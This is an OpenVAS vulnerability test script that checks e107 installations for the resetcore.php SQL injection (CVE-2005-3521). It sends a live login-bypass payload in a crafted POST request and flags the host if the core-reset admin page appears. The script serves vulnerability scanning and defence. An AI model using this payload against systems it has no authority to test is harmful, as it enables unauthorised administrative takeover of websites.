###############################################################################
# OpenVAS Vulnerability Test
# $Id: e107_sql_injection.nasl 13975 2019-03-04 09:32:08Z cfischer $
#
# e107 resetcore.php SQL Injection
#
# Authors:
# David Maciejak <david dot maciejak at kyxar dot fr>
#
# Copyright:
# Copyright (C) 2005 David Maciejak
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

#  Ref: rgod

CPE = "cpe:/a:e107:e107";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.20069");
  script_version("$Revision: 13975 $");
  script_tag(name:"last_modification", value:"$Date: 2019-03-04 10:32:08 +0100 (Mon, 04 Mar 2019) $");
  script_tag(name:"creation_date", value:"2006-03-26 17:55:15 +0200 (Sun, 26 Mar 2006)");
  script_cve_id("CVE-2005-3521");
  script_bugtraq_id(15125);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_name("e107 resetcore.php SQL Injection");

  script_category(ACT_ATTACK);
  script_copyright("This script is Copyright (C) 2005 David Maciejak");
  script_family("Web application abuses");
  script_dependencies("e107_detect.nasl");
  script_mandatory_keys("e107/installed");
  script_require_ports("Services/www", 80);

  script_xref(name:"URL", value:"http://retrogod.altervista.org/e107remote.html");
  script_xref(name:"URL", value:"https://sourceforge.net/project/shownotes.php?release_id=364570");

  script_tag(name:"solution", value:"Upgrade to e107 version 0.6173 or later.");

  script_tag(name:"summary", value:"The remote web server contains a PHP script that is prone to a SQL injection
  attack.");

  script_tag(name:"insight", value:"The remote host appears to be running e107, a web content management system
  written in PHP.

  There is a flaw in the version of e107 on the remote host such that anyone can injection SQL commands through the
  'resetcore.php' script which may be used to gain administrative access trivially.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );

if( dir == "/" ) dir = "";

host = http_host_name( port:port );
variables = "a_name='%27+or+isnull%281%2F0%29%2F*&a_password=vt-test&usubmit=Continue";

url = dir + "/e107_files/resetcore.php";

# Make sure the script exists.
req = http_get( item:url, port:port );
res = http_keepalive_send_recv( port:port, data:req, bodyonly:TRUE );

# If it does...
if( egrep( pattern:"<input [^>]*name='a_(name|password)'", string:res ) ) {

  req = string( "POST ",url, " HTTP/1.1\r\n",
                "Referer: http://", host, req, "\r\n",
                "Host: ", host, "\r\n",
                "Content-Type: application/x-www-form-urlencoded\r\n",
                "Content-Length: ", strlen(variables), "\r\n\r\n",
                variables );
  buf = http_keepalive_send_recv( port:port, data:req, bodyonly:TRUE );

  if( "Reset core to default values" >< buf && "e107 resetcore></title>" >< buf ) {
    report = report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit(0);
  }
}

exit( 99 );